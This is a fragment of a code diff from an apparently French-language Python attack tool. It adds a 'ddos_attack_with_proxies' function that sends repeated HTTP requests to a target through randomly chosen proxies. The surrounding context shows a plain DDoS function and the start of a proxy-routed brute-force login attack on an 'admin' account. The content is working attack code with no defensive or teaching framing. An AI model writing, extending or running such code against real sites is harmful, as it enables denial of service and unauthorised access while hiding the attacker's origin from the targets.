@@ -64,6 +64,17 @@ def ddos_attack(target, max_requests=1000):
     except requests.exceptions.RequestException as e:
         print(colored(f"[!] Erreur lors de l'attaque DDoS : {e}", "red"))
 
+def ddos_attack_with_proxies(target, max_requests=1000):
+    print(colored("[*] Lancement de l'attaque DDoS avec proxies...", "yellow"))
+    try:
+        for _ in range(max_requests):
+            proxy = get_random_proxy()
+            proxies = {"http": proxy, "https": proxy}
+            response = requests.get(target, proxies=proxies, timeout=5)
+            print(f"Sending request to {target} via proxy {proxy}: {response.status_code}")
+    except requests.exceptions.RequestException as e:
+        print(colored(f"[!] Erreur lors de l'attaque DDoS avec proxies : {e}", "red"))
+
 def bruteforce_attack_with_proxies(url, username="admin", chars="abc123", max_length=4):
     print(colored("[ATTENTION ⚠️] Lancement de l'attaque par bruteforce avec proxy...", "yellow"))
     for length in range(1, max_length + 1):
